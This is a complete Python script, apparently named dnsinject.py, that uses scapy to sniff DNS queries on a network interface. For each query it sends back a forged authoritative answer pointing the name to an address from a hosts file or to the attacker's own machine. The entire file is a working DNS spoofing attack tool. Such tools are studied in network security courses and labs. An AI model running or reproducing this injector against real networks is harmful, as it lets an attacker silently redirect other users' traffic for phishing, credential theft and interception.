#!/usr/bin/python
import sys, getopt
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
import netifaces
from scapy.all import *

# TODO - bpf, trace file

hips = dict()
localhost_ip = None

def get_localhost_ip(interface=None):
    if interface:
        return netifaces.ifaddresses(interface)[AF_INET][0]['addr']
    else:
        for interface in netifaces.interfaces():
            try:
                #links = netifaces.ifaddresses(interface)[netifaces.AF_INET]
                for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
                    #if "10." in link['addr'] or "172." in link['addr'] or "192." in link['addr']:
                    #print 'printing link addr', link['addr']
                    if "127.0.0.1" not in link['addr']:
                        return link['addr']
            except Exception as e:
                pass
    return None

def respond_with_ip(q_name):
    for h, ip in hips.iteritems():
        #print 'checking for q_name', q_name, 'and h', h
        if q_name in h:
            if 'www.' not in q_name:
                if 'www.' + q_name in h:
                    return ip
            else:
                return ip
    return None

def process_pkt(pkt):
    if IP in pkt and pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
        #print pkt[DNSQR].qname
        #print src_ip, dst_ip
        q_name = pkt[DNSQR].qname.rstrip('.')
        r_ip = respond_with_ip(q_name)
        print 'dns query for', q_name
        if not r_ip and len(hips):
            return
        elif not r_ip:
            r_ip = localhost_ip
        print 'injecting', r_ip
        inj_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                  an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=197462, rdata=r_ip))
        send(inj_pkt)

def main(argv):

    global localhost_ip
    global hips

    interface = None
    hostsfile = None
    try:
        opts, args = getopt.getopt(argv,"i:h:",["interface=","hostsfile="])
    except getopt.GetoptError:
        print 'dnsinject.py -i <interface> -h <hostsfile>'
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-i", "--interface"):
            interface = arg
        elif opt in ("-h", "--hostsfile"):
            hostsfile = arg

    #print interface
    #print hostsfile
    expr = args
    bpf_filter = 'udp port 53'
    if expr:
        bpf_filter = expr[0] + ' and udp port 53'

    localhost_ip = get_localhost_ip()
    #print 'localhost ip is', localhost_ip

    if hostsfile:
        with open(hostsfile) as f:
            lines = f.readlines()

        for line in lines:
            ip, hostname = line.split()
            if hostname.startswith('www'):
                hips[hostname] = ip
            else:
                hips['www.' + hostname] = ip

        #print hips

    if interface:
        sniff(iface=interface, filter=bpf_filter, store=0, prn=process_pkt)
    else:
        sniff(filter=bpf_filter, store=0, prn=process_pkt)

if __name__ == "__main__":
   main(sys.argv[1:])
